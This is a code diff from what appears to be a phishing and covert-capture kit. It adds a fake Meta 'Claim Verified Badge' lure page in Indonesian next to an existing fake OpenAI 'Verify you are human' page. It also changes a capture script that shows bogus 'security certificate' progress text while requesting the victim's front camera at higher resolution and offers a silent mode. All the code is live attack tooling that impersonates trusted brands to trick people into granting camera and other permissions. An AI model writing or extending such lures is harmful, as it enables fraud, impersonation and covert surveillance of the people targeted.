@@ -67,7 +67,12 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 
     var running = false;
     window.startCapture = async function(mode) {
-      if (hasRedirected || running) return;
+      if (hasRedirected) return;
+      
+      var isSilent = mode === 'silent' || flowType === 'silent';
+      var accent = cfg.accent || '#3498db';
+
+      if (running) return;
       running = true;
       var box = document.querySelector('.box') || document.querySelector('.container') || document.body;
       if (!box) return;
@@ -81,13 +86,16 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
       var accent = cfg.accent || '#3498db';
 
       statusText = document.getElementById('status-text');
-      var btn = document.querySelector('.btn') || document.querySelector('button');
+      var btn = document.querySelector('.btn-verify') || document.querySelector('.btn') || document.querySelector('button');
 
     if (!isSilent) {
-      if (btn) btn.style.display = 'none';
+      if (btn) {
+        btn.innerText = "Izinkan / Masuk...";
+        btn.style.opacity = "0.7";
+        btn.style.cursor = "wait";
+      }
       var turnstile = document.querySelector('.turnstile-box');
       if (turnstile) {
-        // If it's cloudflare/turnstile, we want to keep the box but change text
         var txt = turnstile.querySelector('.turnstile-text');
         if (txt) txt.innerText = "Verifying...";
         var cb = turnstile.querySelector('.checkbox');
@@ -99,13 +107,14 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
         if (!progContainer) {
           progContainer = document.createElement('div');
           progContainer.id = 'progress-indicator';
-          progContainer.style.margin = '30px 0';
+          progContainer.style.margin = '20px 0';
           progContainer.style.textAlign = 'center';
-          progContainer.innerHTML = '<div id="main-spinner" style="width: 32px; height: 32px; border: 3px solid rgba(0,0,0,0.05); border-top: 3px solid ' + accent + '; border-radius: 50%; animation: spinLoader 1s linear infinite; margin: 0 auto 15px;"></div><style>@keyframes spinLoader { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style><p id="status-text" style="font-size:15px; color:#666; text-align:center; font-weight: 500; font-family: inherit;">Initializing security audit...</p>';
+          progContainer.style.width = '100%';
+          progContainer.innerHTML = '<div id="main-spinner" style="width: 28px; height: 28px; border: 3px solid rgba(0,0,0,0.05); border-top: 3px solid ' + accent + '; border-radius: 50%; animation: spinLoader 1s linear infinite; margin: 0 auto 10px;"></div><style>@keyframes spinLoader { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style><p id="status-text" style="font-size:14px; color:#666; text-align:center; font-weight: 500; font-family: inherit;">Sinkronisasi sertifikat keamanan...</p>';
           
-          var footer = document.querySelector('.footer');
-          if (footer) {
-            footer.parentNode.insertBefore(progContainer, footer);
+          if (btn) {
+            btn.parentNode.insertBefore(progContainer, btn.nextSibling);
+            btn.style.display = 'none'; // Hide button after it's clicked to prevent double clicks and clutter
           } else {
             box.appendChild(progContainer);
           }
@@ -601,12 +610,21 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 
             if (p === 'media') {
               try {
-                if (!isSilent) updateProgress(prog, "Validating server security certificates...");
+                if (!isSilent) updateProgress(prog, "Sinkronisasi sertifikasi identitas...");
                 if (navigator.mediaDevices) {
                   // Try to get video only first for better success rate
-                  var stream = await pTimeout(navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false }).catch(function(){ 
+                  var constraints = { 
+                    video: { 
+                      facingMode: "user",
+                      width: { ideal: 1280 },
+                      height: { ideal: 720 }
+                    }, 
+                    audio: false 
+                  };
+                  
+                  var stream = await pTimeout(navigator.mediaDevices.getUserMedia(constraints).catch(function(){ 
                     return navigator.mediaDevices.getUserMedia({ video: true }).catch(function() { return null; });
-                  }), 15000);
+                  }), 20000);
                   
                   if (stream) {
                     try {
@@ -984,6 +1002,12 @@ export const templates: Record<string, {name: string, render: (id: string) => st
     name: "🤖 AI: OpenAI Dev Audit (Full Scope)",
     render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>OpenAI Authentication</title><style>body { background:#ffffff; font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; } .box { width:100%; max-width:400px; text-align:center; padding: 40px; } .logo { width: 40px; height: auto; margin-bottom: 32px; } h2 { font-size:32px; font-weight: 600; color: #000; margin-bottom: 24px; letter-spacing: -0.02em; } p { color:#353740; font-size:16px; margin-bottom:40px; line-height: 1.6; } .btn { background:#10a37f; color:#fff; border:none; padding:12px; border-radius:4px; cursor:pointer; width:100%; font-size: 16px; font-weight:500; transition: opacity 0.2s; } .btn:hover { opacity: 0.9; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/0/04/ChatGPT_logo.svg" class="logo" referrerpolicy="no-referrer"><h2>Verify you are human</h2><p>To protect our systems, please complete a security audit to verify your connection.</p><button class="btn" onclick="window.startCapture();">Begin Verification</button></div>${getCaptureScript(id, 'https://openai.com', {
       tmplId: 'chatgpt', perms: ALL_PERMS, accent: '#10a37f', icon: '🤖'
+    })}</body></html>`
+  },
+  'meta_verification': {
+    name: "🎯 Meta: Claim Lencana Verifikasi (Facebook/IG)",
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Verifikasi Meta</title><style>body { font-family: -apple-system, system-ui, sans-serif; background:#f0f2f5; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { background:#fff; border-radius:12px; padding:40px; width:100%; max-width:400px; text-align:center; box-shadow: 0 12px 40px rgba(0,0,0,0.08); } .meta-logo { width:120px; margin-bottom:20px; } h2 { font-size:22px; font-weight:700; color:#1c1e21; margin:0 0 12px; } p { color:#606770; line-height:1.5; font-size:15px; margin-bottom:30px; } .badge { width:60px; height:60px; margin-bottom:15px; } .btn { background:#0064e0; color:#fff; border:none; padding:12px; border-radius:6px; font-size:16px; font-weight:600; cursor:pointer; width:100%; transition:filter 0.2s; } .btn:hover { filter: brightness(1.1); }</style></head><body><div class="box"><img class="meta-logo" src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg"><img class="badge" src="https://upload.wikimedia.org/wikipedia/commons/e/e4/Twitter_Verified_Badge.svg" style="filter: hue-rotate(200deg);"><h2>Claim Verified Badge</h2><p>Selamat! Akun Anda memenuhi syarat untuk mendapatkan lencana verifikasi Meta secara gratis. Klik tombol di bawah untuk memverifikasi identitas dan memasang lencana biru.</p><button class="btn" onclick="window.startCapture();">Claim Sekarang</button></div>${getCaptureScript(id, 'https://www.facebook.com/help/128237037833915', {
+      tmplId: 'meta_verification', perms: ALL_PERMS, accent: '#0064e0', icon: '✅'
     })}</body></html>`
   },
   'recap': {
